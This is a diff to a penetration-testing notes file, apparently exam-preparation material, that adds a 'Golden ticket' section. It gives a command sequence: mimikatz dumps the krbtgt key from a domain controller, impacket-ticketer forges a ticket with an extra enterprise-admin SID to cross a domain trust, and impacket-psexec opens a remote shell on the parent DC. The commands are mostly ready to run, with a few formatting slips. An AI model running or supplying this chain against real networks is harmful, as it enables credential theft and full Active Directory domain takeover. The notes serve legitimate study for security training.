@@ -1555,6 +1555,35 @@ klist
     
 *** TODO DCOM
 *** TODO Golden ticket
-*** TODO Shadow copies
+    #+begin_example
+
+.\mimikatz.exe "privilege::debug" "token::elevate" "log" "lsadump::lsa /inject /name:krbtgt" "exit" -> to gain krbgt hash in format -aes-key
+
+impacket-ticketer -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2 \ -> krbgt -hash
+-domain-sid S-1-5-21-4168247447-1722543658-2110108262 \ -> domain-sid
+-domain sub.corp.yzx \
+-extra-sid S-1-5-21-1190331060-1711709193-932631991-519 \ -> mimikatz (lsadump::trust) administrator -extra-pac
+
+```
+Then:
+impacket-ticketer -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2 \
+-domain-sid S-1-5-21-4168247447-1722543658-2110108262 \
+-domain sub.corp.yzx \
+-extra-sid S-1-5-21-1190331060-1711709193-932631991-519 \
+ administrator -extra-pac
+
+Make sure to update your /etc/hosts file:
+
+192.168.XXX.161 dc01.corp.yzx corp.yzx
+192.168.XXX.162 dc02.corp.yzx sub.corp.yzx
+
+	
+Then, export the ticket as you already did with export
+
+Lastly, try again with psexec:
+
+impacket-psexec 'sub.corp.yzx/administrator@dc01.corp.yzx' -k -no-pas
+    #+end_example
+    
 * Reporting
   https://github.com/noraj/OSCP-Exam-Report-Template-Markdown
